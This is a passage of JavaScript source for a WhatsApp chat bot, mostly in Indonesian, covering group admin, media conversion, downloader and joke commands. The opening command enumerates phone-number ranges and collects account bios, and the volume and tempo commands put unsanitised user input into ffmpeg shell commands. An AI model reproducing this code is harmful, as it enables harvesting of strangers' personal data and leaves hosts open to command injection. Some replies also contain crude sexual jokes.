        reply(`Searching for WhatsApp account in given range...`)
        reply(`Please wait while i fetch details...`)
        function countInstances(string, word) {
        return string.split(word).length - 1;
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx;
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var nomerny = `*『 List of Whatsapp Numbers 』*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within the range you provided*\n`
        for (let i = 0; i < randomxx; i++) {
        var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
        var status1 = nu[Math.floor(Math.random() * nu.length)]
        var status2 = nu[Math.floor(Math.random() * nu.length)]
        var status3 = nu[Math.floor(Math.random() * nu.length)]
        var dom4 = nu[Math.floor(Math.random() * nu.length)]
        var rndm;
        if (random_length == 1) {
        rndm = `${status1}`
        } else if (random_length == 2) {
        rndm = `${status1}${status2}`
        } else if (random_length == 3) {
        rndm = `${status1}${status2}${status3}`
        } else if (random_length == 4) {
        rndm = `${status1}${status2}${status3}${dom4}`
        }
        var anu = await Miku.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`);
        var anuu = anu.length !== 0 ? anu : false
        try {
        try {
        var anu1 = await Miku.fetchStatus(anu[0].jid)
        } catch {
        var anu1 = '401'
        }
        if (anu1 == '401' || anu1.status.length == 0) {
        nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
        } else {
        nomerny += `🎀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n🔹 *Bio :* ${anu1.status}\n🔸 *Updated On :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
        }
        } catch {
        nowhatsapp += `${number0}${i}${number1}\n`
        }
        }
        reply(`${nomerny}${nobio}${nowhatsapp}`)
        }
        break







 case 'grouplink': case 'gclink': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 let response = await Miku.groupInviteCode(m.chat)
 Miku.sendMessage(m.chat, {text:`*Nama Grup:* *${groupMetadata.subject}* \n\n*Link Grup :* \nhttps://chat.whatsapp.com/${response}l`, "contextInfo": {
 mimetype: "image/jpeg",
 text: `${global.OwnerName}`,
 "forwardingScore": 1000000000,
 isForwarded: true,
 sendEphemeral: true,
 "externalAdReply": {
 "title": `${global.BotName}`,
 "body": `${global.WaterMark}`,
 "previewType": "PHOTO",
 "thumbnailUrl": Thumb,
 "thumbnail": Thumb,
 "sourceUrl": `${global.websitex}`
 }}}, { quoted: m, detectLink: true })
 }
 break


 case 'resetlinkgc':
    case 'resetlinkgroup':
    case 'resetlinkgrup':
    case 'clink':
    case 'resetlink':
    case 'resetgrouplink':
    case 'resetgclink':
    case 'resetgruplink': {
       if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!isBotAdmins) return replay(mess.botadmin)
    if (!isAdmins && !isCreator) return replay(mess.useradmin)
    Miku.groupRevokeInvite(m.chat)
    }
    break


    case 'group': case 'grup': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     if (args[0] === 'close'){
     await Miku.groupSettingUpdate(m.chat, 'announcement').then((res) => replay(`Group has been closed!`)).catch((err) => replay(jsonformat(err)))
     } else if (args[0] === 'open'){
     await Miku.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replay(`Group has been opened!`)).catch((err) => replay(jsonformat(err)))
     } else {
     let buttons = [
     { buttonId: '-group open', buttonText: { displayText: 'Buka' }, type: 1 },
     { buttonId: '-group close', buttonText: { displayText: 'Tutup' }, type: 1 }
     ]
     let buttonMessage = {
     image: BotLogo,
     jpegThumbnail: Thumb,
     caption: `*「 ${global.BotName} 」*\n\n_Group Setting Changer tool_:`,
     footer: `${BotName}`,
     buttons: buttons,
     headerType: 4
     }
     Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
     }
     }
     break

     case 'naikin': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await Miku.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replay(jsonformat(res))).catch((err) => replay(jsonformat(err)))
     }
     break

     case 'turunin': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await Miku.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replay(jsonformat(res))).catch((err) => replay(jsonformat(err)))
     }
     break

     case 'kick':{
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await Miku.groupParticipantsUpdate(m.chat, [users], 'remove')
     }
     break


     case 'join': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!isCreator) return replay(mess.botowner)
     if (!args[0]) return replay(`Where's the link?`)
     vdd = args[0]
     let vcc = vdd.split("https://chat.whatsapp.com/")[1]
     if (!vcc) return replay("Link invalid!")
     if (isCreator) {
     await Miku.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
     replay("Aku udah masuk Ri oniichan")
     } else {
     Miku.query({
     tag: "iq",
     attrs: {
     type: "get",
     xmlns: "w:g2",
     to: "@g.us"
     },
     content: [{ tag: "invite", attrs: { code: vcc } }]
     }).then(async(res) => {
     sizny = res.content[0].attrs.size
     if (sizny < 20) {
     teks = `Sorry, munimun 20 members are required in a group to add bot!`
     sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./Assets/pic7.jpg'), `${global.packname}`, `${global.BotName}`, "916909137213@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
     } else if (sizny > 20) {
     await Miku.groupAcceptInvite(vcc).then(async(res) => replay(jsonformat(res))).catch(_ => _)
     replay("Joined !")
     } else {
     replay("Error")
     }
     }).catch(_ => _)
     }
     }
     break

  
     case 'volume': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
     media = await Miku.downloadAndSaveMediaMessage(quoted, "volume")
     if (isQuotedAudio) {
     rname = getRandom('.mp3')
     exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
     fs.unlinkSync(media)
     if (err) return reply('Error!')
     jadie = fs.readFileSync(rname)
     Miku.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
     fs.unlinkSync(rname)
     })
     } else if (isQuotedVideo) {
     rname = getRandom('.mp4')
     exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
     fs.unlinkSync(media)
     if (err) return reply('Error!')
     jadie = fs.readFileSync(rname)
     Miku.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
     fs.unlinkSync(rname)
     })
     } else {
     reply("Please send video/audio file only!")
     }
     }
     break

     case 'tempo': {
        if (isBan) return reply(mess.banned)
        if (isBanChat) return reply(mess.bangc)
        if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
        var req = args.join(' ')
        media = await Miku.downloadAndSaveMediaMessage(quoted, "tempo")
        if (isQuotedAudio) {
        ran = getRandom('.mp3')
        exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
        fs.unlinkSync(media)
        if (err) return reply('Error!')
        hah = fs.readFileSync(ran)
        Miku.sendMessage(from, {audio:hah, mimetype:'audio/mp4', ptt:true}, {quoted:m})
        fs.unlinkSync(ran)
        })
        } else if (isQuotedVideo) {
        ran = getRandom('.mp4')
        exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
        fs.unlinkSync(media)
        if (err) return reply('Error!')
        hah = fs.readFileSync(ran)
        Miku.sendMessage(from, {video:hah, mimetype:'video/mp4'}, {quoted:m})
        fs.unlinkSync(ran)
        })
        } else {
        reply("Please send video/audio file only!")
        }
        }
        break

        case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
            try {
            let set
            if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
            if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
            if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
            if (/earrape/.test(command)) set = '-af volume=12'
            if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
            if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
            if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
            if (/reverse/.test(command)) set = '-filter_complex "areverse"'
            if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
            if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
            if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
            if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
            if (/audio/.test(mime)) {
            reply(mess.waiting)
            let media = await Miku.downloadAndSaveMediaMessage(quoted)
            let ran = getRandom('.mp3')
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply(err)
            let buff = fs.readFileSync(ran)
            Miku.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
            fs.unlinkSync(ran)
            })
            } else reply(`Pls mention any audio you want to modify _${prefix + command}_`)
            } catch (e) {
            reply(e)
            }
            break

case 'kapankah':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
				if (!text) return replay(`Tambahin Textnya!\n Contoh : *${prefix + command} Kapan saya bisa ngentot waifu?* `)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Months More','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Setelah Dajjal Turun',' 1 Abad Lagi','69 Abad Lagi',`After This Command, You Too ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                                         Miku.sendMessage(from, { text: `Question : ${q}\nAnswer : *${kapankah}*` }, { quoted: m })
		                          break
		
case 'cekmati':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
             if (!text) return replay(`Gunakan Nama orang \nContoh : ${prefix + command} Mamat`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Di umur :* ${predea.data.age} Year.\n\n_Cepatlah bertobat wahai sodaraku, karna kematian tidak ada yang tau_`)
              break	
		
case 'gura':
case 'gurastick':{
	if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Miku.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break	
		
		
case 'kalkulator': case 'kal': case 'calculate':{
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (args.length < 1) return reply(`Contoh Alat Hitung\n\nDitambah *+*\nDikurangan *-* \nDibagi */* \nDikali *\n\nContoh *-kalkulator 2+2* Tambah\nContoh *-kalkulator 2-2* Kurang\nContoh *-kalkulator 2/2* Bagi\nContoh *-kalkulator 2*2* Kali\n`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`\`\`\`「 _Alat Hitung_ 」\`\`\`\n\n*Input :* ${qsd}\n*Hasilnya :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break

case 'public': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.owner)
 Miku.public = true
 reply('Sekarang aku bisa diewe- digunakan oleh semua orang!')
 Miku.setStatus(`Mode : Public`)
 }
 break
 
 case 'self': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.botowner)
 Miku.public = false
 reply('Sekarang Cuma owner yang bisa ngen- menggunakan aku!')
 Miku.setStatus(`Mode : Self`)
 }
 break


case 'toimage': case 'toimg': {
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.waiting)
let media = await Miku.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Miku.sendMessage(m.chat, { image: buffer }, { quoted: m})
fs.unlinkSync(ran)
})
}
break

case 'tomp4': case 'tovideo': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.quoted) return reply('Reply Image')
 if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
 reply(mess.waiting)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await Miku.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
 await Miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Here it is...' } }, { quoted: m })
 await fs.unlinkSync(media)
 }
 break

case 'toaud': case 'toaudio': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
 if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
 reply(mess.waiting)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
 Miku.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
 }
break

case 'tomp3': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
 if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
 reply(mess.waiting)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
 Miku.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${global.BotName} (${m.id}).mp3`}, { quoted : m })
 }
break


case 'togif': case 'getgif':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.quoted) return reply('Reply Image')
 if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
 reply(mess.waiting)
 let { webp2mp4File } = require('./lib/uploader')
 let media = await Miku.downloadAndSaveMediaMessage(quoted)
 let webpToMp4 = await webp2mp4File(media)
 await Miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
 await fs.unlinkSync(media)
 }
 break


	/*case 'tourl': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 reply(mess.waiting)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await Miku.downloadAndSaveMediaMessage(quoted)
 if (/image/.test(mime)) {
 let anu = await TelegraPh(media)
 reply(util.format(anu))
 } else if (!/image/.test(mime)) {
 let anu = await UploadFileUgu(media)
 reply(util.format(anu))
 }
 await fs.unlinkSync(media)
 }
 break*/

 case 'owner': case 'creator': case 'mod': case 'mods':{
    Miku.sendContact(m.chat, global.Owner, m)
    }
    break
case 'translate' : case 'trans' : case 'tl' :
reply(`Contoh!\n\nEnglish Ke Indo : -TLid Ri is my owner\n\nIndo Ke English : -TLen Ri adalah pemilikku`)
break

case 'tlenglish': case 'transenglish': {
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("eumm, kata-katanya mana?")
    tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
    Infoo = tes.info
    Detek = tes.translate
    replay(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
    }
    break
case 'tlindo': case 'transindo': {
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("ehmm, kata²nya mana?")
    tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=id&kata=${args.join(" ")}`)
    Infoo = tes.info
    Detek = tes.translate
    replay(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
    }
    break
case 'scanime' :{
if (!isMod) return reply (mess.mod)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 let media = await Miku.downloadAndSaveMediaMessage(quoted)
 if (/image/.test(mime)) {
 let anu = await TelegraPh(media)
ri = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=${lolkey}&img=${util.format(anu)}`)
Miku.sendMessage(m.chat, {video :{ url : ri.result.video}, caption : `Judul : ${ri.result.title_romaji}          Episode : ${ri.result.episode}.       Persamaan : ${ri.result.similarity}.`})
 } else if (!/image/.test(mime)) {
 let anu = await UploadFileUgu(media)
 reply(util.format(anu))
 }
 await fs.unlinkSync(media)
 }
 break


case 'kuso': case 'kusonime': {
    if (!isMod) return reply (mess.mod)
    if (isBan) return reply(mess.banned)
    if (!args.join(" ")) return replay("ehmm, kata²nya mana?")
    reply (`Bentar lagi dicari....`)
    tes = await fetchJson (`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${args.join(" ")}`)
    a = tes.result.title
    thum = tes.result.thumbnail
  const juduljep = tes.result.japanese
  genre = tes.result.genre
  season = tes.result.seasons
  const produser = tes.result.producers
  tipe = tes.result.type
  status = tes.result.status
  const totalep = tes.result.total_episode
  durasi = tes.result.duration
  rilis = tes.result.released_on
   const link480pgs = tes.result.link_dl["480p"]["Google Sharer"]
   link480pmega = tes.result.link_dl["480p"]["Mega.nz"]
    link720pgs = tes.result.link_dl["720p"]["Google Sharer"]
 const  link720pmega =tes.result.link_dl["720p"]["Mega.nz"]
   const sinop = tes.result.desc
    let teks = `Judul : ${a}\nJudul Jepun : ${juduljep}\n\nGenre : ${genre}\n\nStatus : ${status}\nType : ${tipe}\nTanggal Rilis : ${rilis}\nDurasi : ${durasi}\nTotal Episode : ${totalep}\nSeason : ${season}\nProduser : ${produser}\n\nLink Download 480p!\nGoogle Share : ${link480pgs}\nMega : ${link480pmega}\n\nLink Download 720p!\nGoogle Share : ${link720pgs}\nMega : ${link720pmega}\n\nSinopsis : ${sinop}`
    let riMessage = {
    image : {url : thum},
    caption : teks,
    footer : `Miuna` ,
    headerType : 4,
    }
    
   Miku.sendMessage(from, riMessage).catch((err) => {
                     reply(`Web Eror Atau Judul Salah!`)
                 })  
   
   }
    break



case 'gimage': case 'gig': case 'googleimage':{
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args[0]) return reply("Enter a search term to get Google Image!")
let gis = require('g-i-s')
gis(args.join(" "), async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `-donasi`, buttonText: {displayText: 'Sedekah Kak!'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `「 _Google Image Search_ 」
_Search Term_ : ${text}
_Media Url_ : ${images}`,
footer: `${global.BotName}`,
buttons: buttons,
headerType: 4,

}
Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break


case 'google': case 'search': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Contoh: ${prefix + command} <query>\nUses : ${prefix + command} apa arti cinta`)
 let google = require('google-it')
 google({'query': args.join(" ")}).then(res => {
 let teks = `「 *Google Search Engine* 」\n\n*Search term:* ${args.join(" ")}\n\n\n`
 for (let g of res) {
 teks += `*Title* : ${g.title}\n\n`
 teks += `*Description* : ${g.snippet}\n\n`
 teks += `*Link* : ${g.link}\n\n\n        -----------------------------------------------------------------------------\n\n`
 } 
 reply(teks)
 })
 }
 break


 case 'igdl': case 'instagram': case 'instagramreels': case 'igreels': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Example :\n${prefix + command} https://www.instagram.com/p/CcvJGuxh9VI/?igshid=YmMyMTA2M2Y=`)
 try {
 hx.igdl(args[0]).then(async(resed) => {
 ini_anu = []
 anu_list = []
 textbv = `「 _Instagram Downloader_ 」\n\nUsername : ${resed.user.username ? resed.user.name : "undefined"}\nFollowers : ${resed.user.followers}`
 urut = 1
 for (let i = 0; i < resed.medias.length; i++) {
 ini_anu.push({
  "type": resed.medias[i].fileType,
  "url": resed.medias[i].url
 })
 }
 ilod = 1
 for (let i of ini_anu) {
 anu_list.push({buttonId: `-ig ${i.type} ${i.url}`, buttonText: {displayText: `Media ${ilod++}`}, type: 1})
 }
 textbv += `\n\n_Select the media below to download_`
 let buttons = anu_list
 let buttonMessage = {
 image:BotLogo,
 jpegThumbnail:Thumb,
 caption: textbv,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4
 }
 Miku.sendMessage(from, buttonMessage, {quoted:m})
 })
 } catch (err) {
 reply("An Error Occured!")
 }
 }
 break

 case 'ig': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (args[0] === "mp4") {
Miku.sendMessage(from, {video:{url:args[1]}, caption:'Here it is...', mimetype:'video/mp4'}, {quoted:m})
} else if (args[0] === "jpg") {
Miku.sendMessage(from, {image:{url:args[1]}, caption:'Here it is...'}, {quoted:m})
} else {
reply("Error! ")
}
}
break

case 'jpeg': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply(`Please provide link!`)
 try {
 Miku.sendMessage(from, {image:{url:args[0]}, caption:"Success!"}, {quoted:m})
 } catch {
 reply("Link Eror kek otakmu!")
 }
 }
 break

 case 'igtv': {	            
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
                 if (!text) return reply(`Please provide link!`)
                 const { instagramdl, instagramdlv2, instagramdlv3 } = require('@bochilteam/scraper')
                 if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('*Invalid link!*')
                 instagramdlv3(`${text}`).then(async (data) => {            
                 var buf = await getBuffer(data[0].thumbnail)        
                 Miku.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${BotName}`}, { quoted: m })
                 }).catch((err) => {
                     reply(mess.error)
                 })
             }
             break
             
case 'twitter': case 'td': case 'twitterdl': {     
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)	             
             if (!text) return reply(`Please provide link!`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*Invalid link!*`)
  reply (`Sek...`)
 link = args[0]
ri = await fetchJson(`https://api.akuari.my.id/downloader/twitter?link=${link}`)
desc = ri.desc
nail = ri.thumb
const hd = ri.HD
sd = ri.SD
Miku.sendMessage(from, {video:{url:hd}, mimetype:"video/mp4", caption: 'Kualitas HD' }, {quoted:m})

            }
            break

case 'fb': case 'fbdl':{
if (!args.join(" ")) return reply (`Linknya kak?`)
reply (mess.waiting)
ri = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkey}&url=${args.join(" ")}`)
link = ri.result
Miku.sendMessage(m.chat, {video : {url : link}, caption : `Miuna Facebook Downloader`},{quoted : m })
}
break
 case 'facebook': case 'fbmp4': {     	    
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
              if (!text) return reply(`Taro linknya Njeng! \n\nContoh: ${prefix}facebook https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
                 if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`Invalid link!`)
             let bocil = require('@bochilteam/scraper')  
                 bocil.facebookdlv2(`${text}`).then(async (data) => {                   
                     let txt = `「 _Facebook Downloader_ 」\n\n`
                     txt += `*Judul :* ${data.title}\n`
                     txt += `*Resolusi :* ${data.result[0].quality}\n`
                     txt += `*Deskripsi:* ${data.description}\n`
                     txt += `*Link :* ${text}\n\n`
                 buf = await getBuffer(data.thumbnail)    
                 Miku.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         
                 for (let i of data.result) {     
                 Miku.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*Quality :* ${i.quality}`}, { quoted: m })
                 }          
                 }).catch((err) => {
                     reply(mess.error)
                 })
             }
             break



case 'facebookxx': case 'fbdlxxx': case 'fbmp4xxx': case 'fbxxx': {
   if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args[0]) return reply(`Contoh :\n${prefix + command} https://fb.watch/cAX2dep-BZ/`)
try {
let resd = await aiovideodl(args[0])
teks = `「 _Facebook Downloader_ 」
Tipe : video/${resd.medias[0].extension}
Kualitas : ${resd.medias[0].quality}
Ukuran : ${resd.medias[0].formattedSize}
_Klik tombol dibawah untuk mendownload_`
let buttons = [
{buttonId: `-fbdl ${resd.medias[1].url}`, buttonText: {displayText: 'QualityHD'}, type: 1}
]
let buttonMessage = {
video: {url:resd.medias[0].url},
caption: teks,
footer: `${pushname}`,
buttons: buttons,
headerType: 4,

}
Miku.sendMessage(from, buttonMessage, {quoted:m})
} catch {
reply("Link invalid!")
}
}
break

case 'mp4': {
if (!isCreator) return reply (mess.botowner)
    if (isBan) return reply(mess.banned)	 	
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply (`Link?`)
 Miku.sendMessage(from,{video : {url : args[0]}, caption : `Yattaa..`})
 }
 break
case 'mp3': {
if (!isCreator) return reply (mess.botowner)
    if (isBan) return reply(mess.banned)	 	
 if (isBanChat) return reply(mess.bangc)
 if (!args[0]) return reply (`Link?`)
 Miku.sendMessage(from,{audio : {url : args[0]}, caption : `Silahkeun`})
 }
 break

 case 'tiktok':{
    if (isBan) return reply(mess.banned)
  if (isBanChat) return reply(mess.bangc)
if (!q) return reply('Please provide the link !')
reply(mess.waiting)
if (!q.includes('tiktok')) return reply(`Invalid tiktok link!`)
 const musim_rambutan = await MikuTiktok(`${q}`).catch(e => {
reply(mess.error) 
} )
 console.log(musim_rambutan)
 const mikutiktokop = musim_rambutan.result.watermark
texttk = `_Please choose the button below_`
let buttons = [
{buttonId: `-ttnowm ${q}`, buttonText: {displayText: 'Watermark Free'}, type: 1},
{buttonId: `-ttaud ${q}`, buttonText: {displayText: 'Audio '}, type: 1}
]
let buttonMessage = {
video: {url:mikutiktokop},
caption: texttk,
footer: `${BotName}`,
buttons: buttons,
headerType: 4,

}
Miku.sendMessage(from, buttonMessage, {quoted:m})
}
break

case 'tiktoknowm': case 'ttnowm':{
    if (isBan) return reply(mess.banned)
